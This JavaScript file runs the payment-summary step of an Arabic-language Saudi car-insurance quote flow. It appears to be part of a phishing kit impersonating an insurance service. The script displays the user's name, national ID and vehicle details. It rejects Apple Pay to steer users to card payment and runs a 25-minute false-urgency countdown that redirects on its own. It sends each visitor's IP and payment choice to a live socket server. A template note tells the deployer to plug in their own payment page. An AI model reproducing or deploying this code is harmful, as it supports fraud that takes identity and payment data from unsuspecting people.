
  const BANK_REDIRECT_URL = "paymen.html";



  function mapOfferType(value) {
    if (value === "new") return "تأمين جديد";
    if (value === "transfer") return "نقل ملكية";
    return "-";
  }

  function mapRegType(value) {
    if (value === "serial") return "الرقم التسلسلي";
    if (value === "customs") return "بطاقة جمركية";
    return "-";
  }

  function mapUsageType(value) {
    if (value === "private") return "خصوصي";
    if (value === "commercial") return "تجاري";
    if (value === "ride") return "تطبيقات نقل الركاب";
    return value || "-";
  }



  document.addEventListener("DOMContentLoaded", function() {
    
    let d = {};
    try {
      const tempData = sessionStorage.getItem('tameeniTempData');
      if (tempData) {
        d = JSON.parse(tempData);
      }
    } catch (e) {
      console.error("خطأ في قراءة البيانات المؤقتة:", e);
    }

    
    const summaryList = document.getElementById("summaryList");
    const totalText = document.getElementById("totalText");

    const addonsText = (!d.addons || !Array.isArray(d.addons) || d.addons.length === 0)
      ? "لا يوجد"
      : d.addons.map(a => a.name + " (+" + a.price + " ريال)").join(" | ");

    const total = Number(d.planPrice || 0) + Number(d.addonsTotal || 0);

    
    d.total = total;
    sessionStorage.setItem('tameeniTempData', JSON.stringify(d));

    const items = [
      "الاسم: " + (d.userName || "-"),
      "نوع العرض: " + (d.offerType === 'transfer' ? 'نقل ملكية' : 'تأمين جديد'),
      "نوع تسجيل المركبة: " + (d.regType === 'customs' ? 'بطاقة جمركية [استيراد]' : 'الرقم التسلسلي'),
      "رقم الهوية: " + (d.idNumber || "-"),
      "الرقم التسلسلي: " + (d.serialNumber || "-"),
      "نوع المركبة: " + (d.carMake || "-"),
      "سنة الصنع: " + (d.carYear || "-"),
      "نوع الاستخدام: " + mapUsageType(d.usageType),
      "مدينة الاستخدام: " + (d.city || "-"),
      "تاريخ بداية التأمين: " + (d.startDate || "-"),
      "الشركة المختارة: " + (d.company || "-"),
      "نوع الخطة: " + (d.planType || "-"),
      "السعر الأساسي: " + (d.planPrice || 0) + " ريال",
      "الإضافات: " + addonsText
    ];

    items.forEach(function(txt) {
      const li = document.createElement("li");
      li.textContent = txt;
      summaryList.appendChild(li);
    });

    totalText.textContent = "الإجمالي الكلي: " + total + " ريال";

    
    const optionElems = document.querySelectorAll(".pay-option");
    const radios = document.querySelectorAll(".pay-radio");
    const payError = document.getElementById("payError");
    const appleWarning = document.getElementById("appleWarning");
    const confirmBtn = document.getElementById("confirmBtn");

    const offerModal = document.getElementById("offer-modal");
    const offerCloseBtn = document.getElementById("offerCloseBtn");
    const offerContinueBtn = document.getElementById("offerContinueBtn");
    const minutesEl = document.getElementById("offer-minutes");
    const secondsEl = document.getElementById("offer-seconds");
    let offerInterval;
    let offerRemainingSeconds = 25 * 60; 

    function updateOfferTimerUI() {
      const mins = Math.floor(offerRemainingSeconds / 60);
      const secs = offerRemainingSeconds % 60;
      if (minutesEl) minutesEl.textContent = String(mins).padStart(2, "0");
      if (secondsEl) secondsEl.textContent = String(secs).padStart(2, "0");
    }

    function openOfferModal() {
      if (!offerModal) return;
      offerRemainingSeconds = 25 * 60;
      updateOfferTimerUI();
      offerModal.classList.add("show");
      if (offerInterval) clearInterval(offerInterval);
      offerInterval = setInterval(function() {
        offerRemainingSeconds--;
        if (offerRemainingSeconds <= 0) {
          clearInterval(offerInterval);
          goToBank();
        } else {
          updateOfferTimerUI();
        }
      }, 1000);
    }

    function closeOfferModal() {
      if (!offerModal) return;
      offerModal.classList.remove("show");
      if (offerInterval) clearInterval(offerInterval);
    }

    async function goToBank() {
      showLoadingScreen('جاري التوجه لصفحة الدفع...', 'يرجى الانتظار');

      (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        var method = Array.from(document.querySelectorAll('.pay-radio')).find(function(r){return r.checked;});
        window.socket.emit('submitSummary', { ip: ip, total: d.total, paymentMethod: method ? method.value : '' });
      })();

      setTimeout(() => {
        window.location.href = BANK_REDIRECT_URL;
      }, 1000);
    }

    function showLoadingScreen(text, subtext) {
      const loadingScreen = document.getElementById('loadingScreen');
      const loadingText = document.getElementById('loadingText');
      const loadingSubtext = document.getElementById('loadingSubtext');
      
      loadingText.textContent = text || 'جاري التحميل...';
      loadingSubtext.textContent = subtext || 'يرجى الانتظار';
      loadingScreen.classList.add('show');
    }

    function showLoadingAndRedirect(text, subtext, redirectUrl) {
      showLoadingScreen(text, subtext);
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);
    }

    function clearSelectionClasses() {
      optionElems.forEach(function(opt) {
        opt.classList.remove("selected");
      });
    }

    optionElems.forEach(function(opt) {
      opt.addEventListener("click", function() {
        const method = opt.dataset.method;
        clearSelectionClasses();
        opt.classList.add("selected");
        radios.forEach(function(r) {
          r.checked = (r.value === method);
        });

        payError.textContent = "";
        if (method === "apple") {
          appleWarning.style.display = "block";
        } else {
          appleWarning.style.display = "none";
        }
      });
    });

    radios.forEach(function(radio) {
      radio.addEventListener("change", function() {
        const method = radio.value;
        clearSelectionClasses();
        optionElems.forEach(function(opt) {
          if (opt.dataset.method === method) {
            opt.classList.add("selected");
          }
        });
        payError.textContent = "";
        if (method === "apple") {
          appleWarning.style.display = "block";
        } else {
          appleWarning.style.display = "none";
        }
      });
    });

    confirmBtn.addEventListener("click", function() {
      payError.textContent = "";
      const selected = Array.from(radios).find(r => r.checked);

      if (!selected) {
        payError.textContent = "الرجاء اختيار وسيلة الدفع أولاً.";
        return;
      }

      if (selected.value === "apple") {
        
        appleWarning.style.display = "block";
        return;
      }

      
      if (BANK_REDIRECT_URL && BANK_REDIRECT_URL !== "#") {
        openOfferModal();
      } else {
        alert("تم اختيار الدفع بالبطاقة البنكية. عدّل رابط BANK_REDIRECT_URL في الكود لصفحة الدفع الخاصة بك.");
      }
    });

    if (offerCloseBtn) {
      offerCloseBtn.addEventListener("click", function() {
        closeOfferModal();
      });
    }

    if (offerContinueBtn) {
      offerContinueBtn.addEventListener("click", function() {
        goToBank();
      });
    }
  });